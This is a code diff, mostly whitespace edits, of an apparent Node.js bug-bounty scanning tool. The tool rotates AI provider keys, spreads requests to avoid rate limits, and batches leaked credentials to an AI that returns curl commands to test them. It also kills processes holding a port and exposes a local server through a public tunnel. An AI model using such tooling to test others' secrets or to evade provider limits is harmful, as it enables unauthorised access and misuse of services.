@@ -43,12 +43,12 @@ const ThreadPool = {
     maxWorkers: Math.min(4, numCPUs),
     taskQueue: [],
     activeWorkers: 0,
-    
+
     // Execute heavy task in worker thread
     executeInWorker(taskCode, data) {
         return new Promise((resolve, reject) => {
             const task = { taskCode, data, resolve, reject };
-            
+
             if (this.activeWorkers < this.maxWorkers) {
                 this.runTask(task);
             } else {
@@ -56,10 +56,10 @@ const ThreadPool = {
             }
         });
     },
-    
+
     runTask(task) {
         this.activeWorkers++;
-        
+
         // Create inline worker with task code
         const workerCode = `
             const { parentPort, workerData } = require('worker_threads');
@@ -74,19 +74,19 @@ const ThreadPool = {
                 }
             })();
         `;
-        
+
         try {
             const worker = new Worker(workerCode, {
                 eval: true,
                 workerData: { taskCode: task.taskCode, data: task.data }
             });
-            
+
             const timeout = setTimeout(() => {
                 worker.terminate();
                 task.reject(new Error('Worker timeout'));
                 this.onWorkerDone();
             }, 30000);
-            
+
             worker.on('message', (msg) => {
                 clearTimeout(timeout);
                 if (msg.success) {
@@ -96,13 +96,13 @@ const ThreadPool = {
                 }
                 this.onWorkerDone();
             });
-            
+
             worker.on('error', (err) => {
                 clearTimeout(timeout);
                 task.reject(err);
                 this.onWorkerDone();
             });
-            
+
             worker.on('exit', () => {
                 clearTimeout(timeout);
             });
@@ -117,7 +117,7 @@ const ThreadPool = {
             }
         }
     },
-    
+
     onWorkerDone() {
         this.activeWorkers--;
         if (this.taskQueue.length > 0 && this.activeWorkers < this.maxWorkers) {
@@ -132,7 +132,7 @@ const ThreadPool = {
 
 const AsyncQueue = {
     queues: new Map(),
-    
+
     // Get or create queue for a client
     getQueue(clientId) {
         if (!this.queues.has(clientId)) {
@@ -145,26 +145,26 @@ const AsyncQueue = {
         }
         return this.queues.get(clientId);
     },
-    
+
     // Add task to queue
     async enqueue(clientId, task, priority = 0) {
         const queue = this.getQueue(clientId);
-        
+
         return new Promise((resolve, reject) => {
             queue.tasks.push({ task, priority, resolve, reject });
             queue.tasks.sort((a, b) => b.priority - a.priority);
             this.processQueue(clientId);
         });
     },
-    
+
     // Process queue
     async processQueue(clientId) {
         const queue = this.getQueue(clientId);
-        
+
         while (queue.tasks.length > 0 && queue.activeTasks < queue.maxConcurrent) {
             const { task, resolve, reject } = queue.tasks.shift();
             queue.activeTasks++;
-            
+
             // Execute task without blocking
             setImmediate(async () => {
                 try {
@@ -179,7 +179,7 @@ const AsyncQueue = {
             });
         }
     },
-    
+
     // Clean up client queue
     cleanup(clientId) {
         this.queues.delete(clientId);
@@ -195,7 +195,7 @@ const GuaranteedAI = {
     cache: new Map(),
     cacheMaxSize: 500,
     cacheExpiry: 30 * 60 * 1000, // 30 minutes
-    
+
     // All available providers with their configs
     providers: {
         groq: {
@@ -242,10 +242,10 @@ const GuaranteedAI = {
             isGemini: true
         }
     },
-    
+
     // Browser-provided keys
     browserKeys: new Map(),
-    
+
     // Stats tracking
     stats: {
         cacheHits: 0,
@@ -254,7 +254,7 @@ const GuaranteedAI = {
         successes: 0,
         lastProvider: null
     },
-    
+
     // Generate cache key
     getCacheKey(prompt) {
         // Simple hash for cache key
@@ -266,20 +266,20 @@ const GuaranteedAI = {
         }
         return `ai_${hash}`;
     },
-    
+
     // Check cache
     checkCache(prompt) {
         const key = this.getCacheKey(prompt);
         const cached = this.cache.get(key);
-        
+
         if (cached && Date.now() - cached.timestamp < this.cacheExpiry) {
             this.stats.cacheHits++;
             return cached.response;
         }
-        
+
         return null;
     },
-    
+
     // Save to cache
     saveCache(prompt, response) {
         // Clean old entries if cache too large
@@ -287,18 +287,18 @@ const GuaranteedAI = {
             const oldestKey = this.cache.keys().next().value;
             this.cache.delete(oldestKey);
         }
-        
+
         const key = this.getCacheKey(prompt);
         this.cache.set(key, { response, timestamp: Date.now() });
     },
-    
+
     // Add browser-provided API key
     addBrowserKey(provider, key) {
         provider = provider.toLowerCase();
         if (!this.browserKeys.has(provider)) {
             this.browserKeys.set(provider, []);
         }
-        
+
         const keys = this.browserKeys.get(provider);
         if (!keys.includes(key)) {
             keys.push(key);
@@ -307,7 +307,7 @@ const GuaranteedAI = {
         }
         return false;
     },
-    
+
     // Get best available key for provider
     getKey(provider, terminalAI) {
         // First check browser keys
@@ -318,25 +318,25 @@ const GuaranteedAI = {
             browserKeyList.push(key);
             return key;
         }
-        
+
         // Check TerminalAI key pool
         if (terminalAI && terminalAI.keyPool && terminalAI.keyPool[provider] && terminalAI.keyPool[provider].length > 0) {
             return terminalAI.getNextKey(provider);
         }
-        
+
         // Check backup keys
         if (terminalAI && terminalAI.backupKeys && terminalAI.backupKeys[provider]) {
             return terminalAI.backupKeys[provider];
         }
-        
+
         // Check main configured key
         if (terminalAI && terminalAI.config && terminalAI.config.apiKey) {
             return terminalAI.config.apiKey;
         }
-        
+
         return null;
     },
-    
+
     // Make API request
     async makeRequest(provider, model, prompt, apiKey) {
         return new Promise((resolve) => {
@@ -345,9 +345,9 @@ const GuaranteedAI = {
                 resolve({ error: 'Unknown provider' });
                 return;
             }
-            
+
             let options, data;
-            
+
             if (config.isGemini) {
                 // Gemini uses different format
                 const path = config.path.replace('{model}', model).replace('{key}', apiKey);
@@ -355,7 +355,7 @@ const GuaranteedAI = {
                     contents: [{ parts: [{ text: prompt }] }],
                     generationConfig: { maxOutputTokens: 4096, temperature: 0.7 }
                 });
-                
+
                 options = {
                     hostname: config.hostname,
                     path: path,
@@ -374,7 +374,7 @@ const GuaranteedAI = {
                     max_tokens: 4096,
                     temperature: 0.7
                 });
-                
+
                 options = {
                     hostname: config.hostname,
                     path: config.path,
@@ -386,30 +386,30 @@ const GuaranteedAI = {
                     timeout: 25000
                 };
             }
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
                 res.on('end', () => {
                     try {
                         const json = JSON.parse(body);
-                        
+
                         if (res.statusCode === 429) {
                             this.stats.rateLimits++;
                             resolve({ rateLimited: true });
                             return;
                         }
-                        
+
                         if (res.statusCode === 401 || res.statusCode === 403) {
                             resolve({ authError: true });
                             return;
                         }
-                        
+
                         if (res.statusCode >= 500) {
                             resolve({ serverError: true });
                             return;
                         }
-                        
+
                         // Extract response
                         let content = null;
                         if (json.choices && json.choices[0]?.message?.content) {
@@ -417,7 +417,7 @@ const GuaranteedAI = {
                         } else if (json.candidates && json.candidates[0]?.content?.parts?.[0]?.text) {
                             content = json.candidates[0].content.parts[0].text;
                         }
-                        
+
                         if (content) {
                             this.stats.successes++;
                             this.stats.lastProvider = `${provider}/${model}`;
@@ -430,80 +430,80 @@ const GuaranteedAI = {
                     }
                 });
             });
-            
+
             req.setTimeout(25000, () => {
                 req.destroy();
                 resolve({ timeout: true });
             });
-            
+
             req.on('error', (e) => {
                 resolve({ error: e.message });
             });
-            
+
             req.write(data);
             req.end();
         });
     },
-    
+
     // MAIN QUERY - GUARANTEED TO RETURN SOMETHING
     async query(prompt, terminalAI = null) {
         this.stats.apiCalls++;
-        
+
         // 1. Check cache first
         const cached = this.checkCache(prompt);
         if (cached) {
             console.log('\x1b[32m[GuaranteedAI] ⚡ Cache hit!\x1b[0m');
             return cached;
         }
-        
+
         // 2. Try all providers in priority order
         const providerOrder = Object.entries(this.providers)
             .sort((a, b) => a[1].priority - b[1].priority)
             .map(([name]) => name);
-        
+
         for (const provider of providerOrder) {
             const config = this.providers[provider];
             const apiKey = this.getKey(provider, terminalAI);
-            
+
             if (!apiKey && config.needsKey) {
                 continue; // Skip if no key available
             }
-            
+
             // Try each model for this provider
             for (const model of config.models) {
                 console.log(`\x1b[36m[GuaranteedAI] 🔄 Trying ${provider}/${model}...\x1b[0m`);
-                
+
                 const result = await this.makeRequest(provider, model, prompt, apiKey);
-                
+
                 if (result.content) {
                     console.log(`\x1b[32m[GuaranteedAI] ✅ Success from ${provider}/${model}\x1b[0m`);
                     this.saveCache(prompt, result.content);
                     return result.content;
                 }
-                
+
                 if (result.rateLimited) {
                     console.log(`\x1b[33m[GuaranteedAI] ⏳ Rate limited on ${provider}/${model}, trying next...\x1b[0m`);
                     continue;
                 }
-                
+
                 if (result.authError) {
                     console.log(`\x1b[33m[GuaranteedAI] 🔑 Auth error on ${provider}, skipping...\x1b[0m`);
                     break; // Skip to next provider
                 }
-                
+
                 // Other errors - try next model
             }
         }
-        
+
         // 3. All providers failed - return smart fallback
         console.log('\x1b[33m[GuaranteedAI] ⚠️ All providers exhausted, using fallback response...\x1b[0m');
         return this.generateFallbackResponse(prompt);
     },
-    
+
     // Generate intelligent fallback when all APIs fail
     generateFallbackResponse(prompt) {
         const promptLower = prompt.toLowerCase();
-        
+
         // Security-related fallbacks
         if (promptLower.includes('xss') || promptLower.includes('cross-site')) {
             return `**XSS Analysis Fallback (API unavailable)**
@@ -521,7 +521,7 @@ Payloads to test:
 
 Check for: innerHTML assignments, document.write, eval(), setTimeout/setInterval with strings`;
         }
-        
+
         if (promptLower.includes('sql') || promptLower.includes('injection')) {
             return `**SQL Injection Analysis Fallback (API unavailable)**
 
@@ -537,7 +537,7 @@ Look for:
 - Different responses for true/false conditions
 - Time delays on sleep injections`;
         }
-        
+
         if (promptLower.includes('csrf') || promptLower.includes('request forgery')) {
             return `**CSRF Analysis Fallback (API unavailable)**
 
@@ -552,7 +552,7 @@ Test:
 - Remove/modify CSRF token
 - Try from different origin`;
         }
-        
+
         // Default security response
         return `**Security Analysis (API temporarily unavailable)**
 
@@ -576,7 +576,7 @@ I couldn't connect to AI providers. Here are general security checks:
 
 Stats: ${this.stats.apiCalls} calls, ${this.stats.rateLimits} rate limits, ${this.stats.successes} successes`;
     },
-    
+
     // Get stats
     getStats() {
         return {
@@ -598,7 +598,7 @@ const AutoHealer = {
     // Check and install missing dependencies
     async checkDependencies() {
         console.log('\x1b[36m[AutoHealer] Checking dependencies...\x1b[0m');
-        
+
         // Check if ws module is installed
         try {
             const wsModule = require('ws');
@@ -619,23 +619,23 @@ const AutoHealer = {
             }
         }
     },
-    
+
     // Check if port is in use and kill the process or find alternative
     async resolvePortConflict(port) {
         console.log(`\x1b[36m[AutoHealer] Checking if port ${port} is available...\x1b[0m`);
-        
+
         const isPortInUse = await this.isPortInUse(port);
-        
+
         if (!isPortInUse) {
             console.log(`\x1b[32m[AutoHealer] ✓ Port ${port} is available\x1b[0m`);
             return port;
         }
-        
+
         console.log(`\x1b[33m[AutoHealer] ⚠ Port ${port} is in use, attempting to free it...\x1b[0m`);
-        
+
         // Try to kill the process using the port
         const killed = await this.killProcessOnPort(port);
-        
+
         if (killed) {
             // Wait a bit for port to be released
             await this.sleep(1000);
@@ -645,14 +645,14 @@ const AutoHealer = {
                 return port;
             }
         }
-        
+
         // If couldn't kill, find an alternative port
         console.log(`\x1b[33m[AutoHealer] ⚠ Could not free port ${port}, finding alternative...\x1b[0m`);
         const alternativePort = await this.findAvailablePort(port);
         console.log(`\x1b[32m[AutoHealer] ✓ Using alternative port: ${alternativePort}\x1b[0m`);
         return alternativePort;
     },
-    
+
     // Check if port is in use
     isPortInUse(port) {
         return new Promise((resolve) => {
@@ -665,13 +665,13 @@ const AutoHealer = {
             server.listen(port, '0.0.0.0');
         });
     },
-    
+
     // Kill process on port
     async killProcessOnPort(port) {
         return new Promise((resolve) => {
             const platform = os.platform();
             let cmd;
-            
+
             if (platform === 'win32') {
                 // Windows - netstat + taskkill
                 cmd = `for /f "tokens=5" %a in ('netstat -ano ^| findstr :${port} ^| findstr LISTENING') do taskkill /PID %a /F 2>nul`;
@@ -679,13 +679,13 @@ const AutoHealer = {
                 // Linux/Mac - fuser or lsof
                 cmd = `fuser -k ${port}/tcp 2>/dev/null || lsof -ti:${port} | xargs kill -9 2>/dev/null || true`;
             }
-            
+
             exec(cmd, { shell: true }, (error) => {
                 resolve(!error);
             });
         });
     },
-    
+
     // Find available port starting from preferred
     async findAvailablePort(startPort) {
         for (let port = startPort; port < startPort + 100; port++) {
@@ -694,21 +694,21 @@ const AutoHealer = {
         }
         return startPort + Math.floor(Math.random() * 1000);
     },
-    
+
     // Sleep helper
     sleep(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     },
-    
+
     // Download and install cloudflared
     async installCloudflared() {
         console.log('\x1b[36m[AutoHealer] Installing cloudflared...\x1b[0m');
-        
+
         const platform = os.platform();
         const arch = os.arch();
-        
+
         let downloadUrl, installPath;
-        
+
         if (platform === 'linux') {
             if (arch === 'x64' || arch === 'amd64') {
                 downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';
@@ -728,23 +728,23 @@ const AutoHealer = {
             console.log('\x1b[33m[AutoHealer] ⚠ Unsupported platform for cloudflared auto-install\x1b[0m');
             return null;
         }
-        
+
         console.log(`\x1b[36m[AutoHealer] Downloading cloudflared for ${platform}/${arch}...\x1b[0m`);
-        
+
         return new Promise((resolve) => {
-            const downloadCmd = platform === 'win32' 
+            const downloadCmd = platform === 'win32'
                 ? `curl -L -o "${installPath}" "${downloadUrl}"`
                 : `curl -L -o "${installPath}" "${downloadUrl}" && chmod +x "${installPath}"`;
-            
+
             exec(downloadCmd, { timeout: 60000 }, (error, stdout, stderr) => {
                 if (error) {
                     console.log(`\x1b[33m[AutoHealer] ⚠ Download failed: ${error.message}\x1b[0m`);
-                    
+
                     // Try wget as fallback
                     const wgetCmd = platform === 'win32'
                         ? null
                         : `wget -O "${installPath}" "${downloadUrl}" && chmod +x "${installPath}"`;
-                    
+
                     if (wgetCmd) {
                         exec(wgetCmd, { timeout: 60000 }, (wgetErr) => {
                             if (wgetErr) {
@@ -765,31 +765,31 @@ const AutoHealer = {
             });
         });
     },
-    
+
     // Check if cloudflared is installed, install if not
     async ensureCloudflared() {
         return new Promise((resolve) => {
             // Check if already installed
             const checkCmd = os.platform() === 'win32' ? 'where cloudflared' : 'which cloudflared';
-            
+
             exec(checkCmd, (error, stdout) => {
                 if (!error && stdout.trim()) {
                     console.log('\x1b[32m[AutoHealer] ✓ cloudflared found at:', stdout.trim(), '\x1b[0m');
                     resolve(stdout.trim());
                     return;
                 }
-                
+
                 // Check if in temp location
-                const tempPath = os.platform() === 'win32' 
+                const tempPath = os.platform() === 'win32'
                     ? path.join(os.tmpdir(), 'cloudflared.exe')
                     : '/tmp/cloudflared';
-                
+
                 if (fs.existsSync(tempPath)) {
                     console.log('\x1b[32m[AutoHealer] ✓ cloudflared found at:', tempPath, '\x1b[0m');
                     resolve(tempPath);
                     return;
                 }
-                
+
                 // Download and install
                 console.log('\x1b[33m[AutoHealer] ⚠ cloudflared not found, downloading...\x1b[0m');
                 this.installCloudflared().then(resolve);
@@ -814,13 +814,13 @@ const UltraRateLimitBypass = {
         providerSwitches: 0,
         rateLimitsAvoided: 0
     },
-    
+
     // === RESPONSE CACHE ===
     cache: {
         store: new Map(),
         maxSize: 500,
         ttl: 3600000, // 1 hour cache
-        
+
         // Generate cache key from prompt
         getKey(prompt) {
             // Normalize prompt - extract key parts
@@ -832,7 +832,7 @@ const UltraRateLimitBypass = {
                 .replace(/xox[baprs]-[a-zA-Z0-9-]+/g, 'SLACK_TOKEN')
                 .replace(/\n\s+/g, ' ')
                 .substring(0, 500);
-            
+
             // Simple hash
             let hash = 0;
             for (let i = 0; i < normalized.length; i++) {
@@ -841,85 +841,85 @@ const UltraRateLimitBypass = {
             }
             return `cache_${Math.abs(hash).toString(36)}`;
         },
-        
+
         // Get cached response
         get(prompt) {
             const key = this.getKey(prompt);
             const entry = this.store.get(key);
-            
+
             if (entry && Date.now() - entry.timestamp < this.ttl) {
                 UltraRateLimitBypass.stats.cachedResponses++;
                 return entry.response;
             }
-            
+
             if (entry) this.store.delete(key); // Expired
             return null;
         },
-        
+
         // Set cached response
         set(prompt, response) {
             if (!response || response.error) return;
-            
+
             const key = this.getKey(prompt);
-            
+
             // Evict old entries if full
             if (this.store.size >= this.maxSize) {
                 const oldestKey = this.store.keys().next().value;
                 this.store.delete(oldestKey);
             }
-            
+
             this.store.set(key, {
                 response,
                 timestamp: Date.now()
             });
         },
-        
+
         // Clear cache
         clear() {
             this.store.clear();
         }
     },
-    
+
     // === BATCH PROCESSOR ===
     batchProcessor: {
         queue: [],
         batchSize: 5,  // Analyze 5 findings in one request
         batchTimeout: null,
         batchDelay: 100, // Wait 100ms to collect more items
-        
+
         // Add item to batch queue
         add(item, callback) {
             this.queue.push({ item, callback, addedAt: Date.now() });
-            
+
             // Start batch timer if not running
             if (!this.batchTimeout) {
                 this.batchTimeout = setTimeout(() => this.processBatch(), this.batchDelay);
             }
-            
+
             // Process immediately if batch is full
             if (this.queue.length >= this.batchSize) {
                 clearTimeout(this.batchTimeout);
                 this.processBatch();
             }
         },
-        
+
         // Process current batch
         async processBatch() {
             this.batchTimeout = null;
-            
+
             if (this.queue.length === 0) return;
-            
+
             // Take items from queue
             const batch = this.queue.splice(0, this.batchSize);
             UltraRateLimitBypass.stats.batchedRequests += batch.length;
-            
+
             // Will be processed by BatchedAnalyzer
             if (typeof BatchedAnalyzer !== 'undefined') {
                 await BatchedAnalyzer.processBatch(batch);
             }
         }
     },
-    
+
     // === MULTI-PROVIDER DISTRIBUTOR ===
     providerDistributor: {
         // Provider priority and status
@@ -933,7 +933,7 @@ const UltraRateLimitBypass = {
             openrouter: { priority: 7, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
             huggingface: { priority: 99, rpm: 10, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true }
         },
-        
+
         // Reset minute counters
         resetCountersIfNeeded() {
             const now = Date.now();
@@ -944,12 +944,12 @@ const UltraRateLimitBypass = {
                 }
             });
         },
-        
+
         // Get best available provider
         getBestProvider(keysAvailable = {}) {
             this.resetCountersIfNeeded();
             const now = Date.now();
-            
+
             // Sort by: has key, not in cooldown, lowest usage ratio, highest priority
             const sorted = Object.entries(this.providers)
                 .filter(([name, p]) => {
@@ -978,19 +978,19 @@ const UltraRateLimitBypass = {
                     // Finally by priority
                     return a.priority - b.priority;
                 });
-            
+
             if (sorted.length > 0 && sorted[0].canUse) {
                 return sorted[0].name;
             }
-            
+
             // All providers at limit - return the one closest to reset
             if (sorted.length > 0) {
                 return sorted[0].name; // Will wait
             }
-            
+
             return null;
         },
-        
+
         // Record usage
         recordUsage(provider) {
             const p = this.providers[provider];
@@ -1000,7 +1000,7 @@ const UltraRateLimitBypass = {
                 UltraRateLimitBypass.stats.totalRequests++;
             }
         },
-        
+
         // Record rate limit
         recordRateLimit(provider, cooldownMs = 60000) {
             const p = this.providers[provider];
@@ -1010,22 +1010,22 @@ const UltraRateLimitBypass = {
                 UltraRateLimitBypass.stats.providerSwitches++;
             }
         },
-        
+
         // Mark provider unhealthy
         markUnhealthy(provider) {
             const p = this.providers[provider];
             if (p) p.healthy = false;
         },
-        
+
         // Get wait time until any provider is available
         getWaitTime(keysAvailable = {}) {
             const now = Date.now();
             let minWait = Infinity;
-            
+
             Object.entries(this.providers).forEach(([name, p]) => {
                 if (!keysAvailable[name] && name !== 'huggingface') return;
                 if (!p.healthy) return;
-                
+
                 // If in cooldown
                 if (now < p.cooldownUntil) {
                     minWait = Math.min(minWait, p.cooldownUntil - now);
@@ -1039,15 +1039,15 @@ const UltraRateLimitBypass = {
                     minWait = 0; // Available now
                 }
             });
-            
+
             return Math.max(0, minWait);
         },
-        
+
         // Get status
         getStatus() {
             this.resetCountersIfNeeded();
             const now = Date.now();
-            
+
             return Object.entries(this.providers).map(([name, p]) => ({
                 name: name.toUpperCase(),
                 used: p.used,
@@ -1058,7 +1058,7 @@ const UltraRateLimitBypass = {
             }));
         }
     },
-    
+
     // === SMART REQUEST HANDLER ===
     async smartRequest(prompt, options = {}) {
         // 1. Check cache first
@@ -1067,7 +1067,7 @@ const UltraRateLimitBypass = {
             this.stats.rateLimitsAvoided++;
             return cached;
         }
-        
+
         // 2. ALWAYS USE THE CONFIGURED PROVIDER - NO COMPLEX LOGIC
         // The user set their key with ai-key, use that provider!
         if (typeof TerminalAI !== 'undefined' && TerminalAI.config?.apiKey && TerminalAI.config?.provider) {
@@ -1075,17 +1075,17 @@ const UltraRateLimitBypass = {
             this.providerDistributor.recordUsage(provider);
             return { useProvider: provider };
         }
-        
+
         // 3. Fallback to huggingface only if NO key is configured
         this.providerDistributor.recordUsage('huggingface');
         return { useProvider: 'huggingface' };
     },
-    
+
     // === INITIALIZATION ===
     init() {
         if (this.initialized) return;
         this.initialized = true;
-        
+
         // Start periodic stats logging
         setInterval(() => {
             if (this.stats.totalRequests > 0) {
@@ -1096,30 +1096,30 @@ const UltraRateLimitBypass = {
             }
         }, 300000); // Every 5 minutes
     },
-    
+
     // === SHOW STATUS ===
     showStatus() {
         console.log('\n\x1b[1m\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m');
         console.log('\x1b[1m\x1b[35m   🚀 ULTRA RATE LIMIT BYPASS STATUS\x1b[0m');
         console.log('\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m\n');
-        
+
         console.log('\x1b[1m  📊 Statistics:\x1b[0m');
         console.log(`     Total Requests: ${this.stats.totalRequests}`);
         console.log(`     Cached Responses: ${this.stats.cachedResponses}`);
         console.log(`     Provider Switches: ${this.stats.providerSwitches}`);
         console.log(`     Rate Limits Avoided: ${this.stats.rateLimitsAvoided}`);
         console.log(`     Cache Size: ${this.cache.store.size}/${this.cache.maxSize}`);
-        
+
         console.log('\n\x1b[1m  🔄 Provider Status:\x1b[0m');
         this.providerDistributor.getStatus().forEach(p => {
-            const bar = '█'.repeat(Math.round(p.used / p.limit * 10)) + 
-                        '░'.repeat(10 - Math.round(p.used / p.limit * 10));
+            const bar = '█'.repeat(Math.round(p.used / p.limit * 10)) +
+                '░'.repeat(10 - Math.round(p.used / p.limit * 10));
             const statusColor = p.inCooldown ? '\x1b[31m' : p.used < p.limit * 0.5 ? '\x1b[32m' : '\x1b[33m';
-            const status = p.inCooldown ? `COOLDOWN ${p.cooldownRemaining}s` : 
-                          p.healthy ? 'OK' : 'UNHEALTHY';
+            const status = p.inCooldown ? `COOLDOWN ${p.cooldownRemaining}s` :
+                p.healthy ? 'OK' : 'UNHEALTHY';
             console.log(`     ${p.name.padEnd(12)} [${statusColor}${bar}\x1b[0m] ${p.used}/${p.limit} RPM - ${status}`);
         });
-        
+
         console.log('\n\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m\n');
     }
 };
@@ -1133,7 +1133,7 @@ const BatchedAnalyzer = {
     // Process batch of findings in ONE AI request
     async processBatch(items) {
         if (!items || items.length === 0) return;
-        
+
         // Group items by type
         const grouped = {};
         items.forEach(({ item, callback }) => {
@@ -1141,23 +1141,23 @@ const BatchedAnalyzer = {
             if (!grouped[type]) grouped[type] = [];
             grouped[type].push({ item, callback });
         });
-        
+
         // Process each group with single AI call
         for (const [type, groupItems] of Object.entries(grouped)) {
             await this.analyzeGroup(type, groupItems);
         }
     },
-    
+
     // Analyze a group of similar findings in ONE request
     async analyzeGroup(type, groupItems) {
         const findings = groupItems.map(g => g.item);
-        
+
         // Format all findings for batch analysis
-        const findingsList = findings.map((f, i) => 
+        const findingsList = findings.map((f, i) =>
             `[${i + 1}] Value: ${(f.fullValue || f.value || '').substring(0, 60)}...
      Source: ${f.source?.type || 'unknown'} → ${f.source?.location || 'unknown'}`
         ).join('\n\n');
-        
+
         const batchPrompt = `Analyze these ${findings.length} ${type} credentials in BATCH. Be efficient.
 
 CREDENTIALS TO ANALYZE:
@@ -1185,24 +1185,24 @@ Respond in JSON array format:
         try {
             // Use TerminalAI.query if available
             if (typeof TerminalAI !== 'undefined' && TerminalAI.query) {
-                const response = await TerminalAI.query(batchPrompt, { 
+                const response = await TerminalAI.query(batchPrompt, {
                     systemPrompt: 'Security expert. JSON array only.',
                     batchMode: true // Signal this is a batch request
                 });
-                
+
                 if (response && !response.error) {
                     // Parse response and distribute to callbacks
                     try {
                         const match = response.match(/\[[\s\S]*\]/);
                         if (match) {
                             const results = JSON.parse(match[0]);
-                            
+
                             results.forEach((result, i) => {
                                 if (groupItems[i]?.callback) {
                                     groupItems[i].callback(null, result);
                                 }
                             });
-                            
+
                             return;
                         }
                     } catch (parseErr) {
@@ -1211,12 +1211,12 @@ Respond in JSON array format:
                     }
                 }
             }
-            
+
             // Fallback: call callbacks with error
             groupItems.forEach(g => {
                 if (g.callback) g.callback(new Error('Batch analysis failed'), null);
             });
-            
+
         } catch (error) {
             console.log(`\x1b[31m[BatchedAnalyzer] Error: ${error.message}\x1b[0m`);
             groupItems.forEach(g => {
@@ -1224,51 +1224,51 @@ Respond in JSON array format:
             });
         }
     },
-    
+
     // Analyze findings using batch mode (called from deep analysis)
     async analyzeFindingsBatched(findings, onResult) {
         const batchSize = 5;
         const batches = [];
-        
+
         // Split into batches
         for (let i = 0; i < findings.length; i += batchSize) {
             batches.push(findings.slice(i, i + batchSize));
         }
-        
+
         console.log(`\x1b[36m[BatchedAnalyzer] Processing ${findings.length} findings in ${batches.length} batches\x1b[0m`);
-        
+
         // Process batches with delay between them
         for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
             const batch = batches[batchIndex];
-            
+
             console.log(`\x1b[35m[Batch ${batchIndex + 1}/${batches.length}] Analyzing ${batch.length} findings...\x1b[0m`);
-            
+
             const batchPrompt = this.createBatchPrompt(batch);
-            
+
             try {
                 // Smart provider selection
                 const smartResult = await UltraRateLimitBypass.smartRequest(batchPrompt);
-                
+
                 if (typeof TerminalAI !== 'undefined') {
                     // Override provider if smart system suggests
-                    const queryOptions = { 
+                    const queryOptions = {
                         systemPrompt: 'Elite security researcher. Respond with JSON array only.',
                         batchMode: true
                     };
-                    
+
                     if (smartResult.useProvider) {
                         queryOptions.forceProvider = smartResult.useProvider;
                     }
-                    
+
                     const response = await TerminalAI.query(batchPrompt, queryOptions);
-                    
+
                     if (response && !response.error) {
                         // Cache the response
                         UltraRateLimitBypass.cache.set(batchPrompt, response);
-                        
+
                         // Parse and distribute results
                         const results = this.parseResults(response);
-                        
+
                         batch.forEach((finding, i) => {
                             if (results[i] && onResult) {
                                 onResult(finding, results[i]);
@@ -1276,17 +1276,17 @@ Respond in JSON array format:
                         });
                     }
                 }
-                
+
                 // Delay between batches (3-5 seconds)
                 if (batchIndex < batches.length - 1) {
                     const delay = 3000 + Math.random() * 2000;
-                    console.log(`\x1b[2m   Waiting ${Math.round(delay/1000)}s before next batch...\x1b[0m`);
+                    console.log(`\x1b[2m   Waiting ${Math.round(delay / 1000)}s before next batch...\x1b[0m`);
                     await new Promise(r => setTimeout(r, delay));
                 }
-                
+
             } catch (error) {
                 console.log(`\x1b[31m[Batch ${batchIndex + 1}] Error: ${error.message}\x1b[0m`);
-                
+
                 // Wait longer on error
                 if (batchIndex < batches.length - 1) {
                     await new Promise(r => setTimeout(r, 10000));
@@ -1294,7 +1294,7 @@ Respond in JSON array format:
             }
         }
     },
-    
+
     // Create efficient batch prompt
     createBatchPrompt(findings) {
         const findingsList = findings.map((f, i) => {
@@ -1304,7 +1304,7 @@ Respond in JSON array format:
     VALUE: ${value}
     SOURCE: ${source}`;
         }).join('\n\n');
-        
+
         return `BATCH SECURITY ANALYSIS - Analyze ALL ${findings.length} credentials below.
 
 ${findingsList}
@@ -1319,7 +1319,7 @@ For EACH credential numbered [1] to [${findings.length}], provide:
 RESPOND WITH ONLY A JSON ARRAY - NO OTHER TEXT:
 [{"index":1,"service":"...","isFalsePositive":false,"curlCommand":"curl...","bountyEstimate":"$X-$Y","impact":"..."},...]`;
     },
-    
+
     // Parse batch results from AI response
     parseResults(response) {
         try {
@@ -1331,12 +1331,12 @@ RESPOND WITH ONLY A JSON ARRAY - NO OTHER TEXT:
         } catch (e) {
             console.log('\x1b[33m[BatchedAnalyzer] Failed to parse JSON, extracting manually\x1b[0m');
         }
-        
+
         // Fallback: try to extract individual results
         const results = [];
         const pattern = /\[(\d+)\][\s\S]*?service[:\s"]+([^",\n]+)[\s\S]*?curlCommand[:\s"]+([^"]+)/gi;
         let match;
-        
+
         while ((match = pattern.exec(response)) !== null) {
             results.push({
                 index: parseInt(match[1]),
@@ -1345,7 +1345,7 @@ RESPOND WITH ONLY A JSON ARRAY - NO OTHER TEXT:
                 isFalsePositive: response.toLowerCase().includes('false positive')
             });
         }
-        
+
         return results;
     }
 };
@@ -1376,7 +1376,7 @@ const CONFIG = {
     SYNC_INTERVAL: 30000,   // Re-sync every 30s
     AI_DEEP_ANALYSIS: true, // Deep analysis on findings
     QUIET_MODE: false,      // When true, background logs go to file only
-    
+
     // Cloudflare Tunnel Config
     USE_CLOUDFLARE: true,           // Auto-start cloudflared tunnel
     CLOUDFLARE_URL: null,           // Will be set when tunnel starts
@@ -1412,7 +1412,7 @@ const CloudflareTunnel = {
     isRunning: false,
     retryCount: 0,
     cloudflaredPath: 'cloudflared',
-    
+
     // Check if cloudflared is installed
     async isInstalled() {
         return new Promise((resolve) => {
@@ -1421,40 +1421,40 @@ const CloudflareTunnel = {
             });
         });
     },
-    
+
     // Start cloudflared tunnel
     async start(port, cloudflaredPath = null) {
         if (CONFIG.NO_CLOUDFLARE) {
             log('Cloudflare Tunnel disabled (--no-cloudflare flag)', 'yellow');
             return null;
         }
-        
+
         // Use provided path or default
         this.cloudflaredPath = cloudflaredPath || 'cloudflared';
-        
+
         log('🌐 Starting Cloudflare Tunnel...', 'cyan');
-        
+
         return new Promise((resolve) => {
             try {
                 this.process = spawn(this.cloudflaredPath, ['tunnel', '--url', `http://localhost:${port}`], {
                     stdio: ['ignore', 'pipe', 'pipe']
                 });
-                
+
                 let urlFound = false;
                 const urlRegex = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i;
-                
+
                 const handleOutput = (data) => {
                     const output = data.toString();
                     const match = output.match(urlRegex);
-                    
+
